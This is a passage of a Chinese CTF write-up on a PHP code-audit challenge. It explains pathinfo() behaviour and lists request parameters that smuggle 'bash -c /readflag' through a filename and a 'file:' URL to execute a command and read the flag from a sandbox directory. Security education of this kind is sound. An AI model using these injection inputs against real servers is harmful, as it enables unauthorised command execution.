-<h3 id="pathinfo-函数"><a href="#pathinfo-函数" class="headerlink" title="pathinfo()函数"></a>pathinfo()函数</h3><p>pathinfo()函数以数组的形式返回关于文件路径信息</p>
-<p>代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print_r(pathinfo(&quot;bash -c /readflag|&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>输出结果为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [dirname] =&gt; bash -c</span><br><span class="line">    [basename] =&gt; readflag|</span><br><span class="line">    [filename] =&gt; readflag|</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<p>由于bash -c相当于当前目录，即.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@mkdir($dir);</span><br><span class="line">@chdir($dir);</span><br></pre></td></tr></table></figure>
-<p>所以这串代码没什么作用，最后这串代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br></pre></td></tr></table></figure>
-<p>就是将$data，就是GET命令执行后的内容写在$info[basename]文件中，而这个文件就在/sandbox/md5(“orange”.ip)/目录下，所以我们可以先读取目录信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=aaa</span><br></pre></td></tr></table></figure>
-<p>然后访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/sandbox/md5(&quot;orange&quot;.ip)/aaa</span><br></pre></td></tr></table></figure>
-<p>即可得到目录信息，然后我们可以看见readflag和flag，我们可以读取readflag来读取flag出来，因为目录下如果没有readflag的话是无法读取的，所以以防万一，我们可以先创建readflag文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&amp;filename=bash -c /readflag</span><br></pre></td></tr></table></figure>
-<p>来创建bash -c /readflag，即./readflag，就是在本目录下创建readflag文件<br>然后使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag&amp;filename=aaa</span><br></pre></td></tr></table></figure>
-<p>来用GET命令来执行./readflag，并将内容放入aaa文件中，所以我们可以通过访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/sandbox/md5(&quot;orange&quot;.ip)/aaa</span><br></pre></td></tr></table></figure>
-<p>来读取flag</p>
-<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105868449]">https://blog.csdn.net/qq_45521281/article/details/105868449]</a></p>
-<pre><code>[https://www.freesion.com/article/1523820728/]
-</code></pre>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
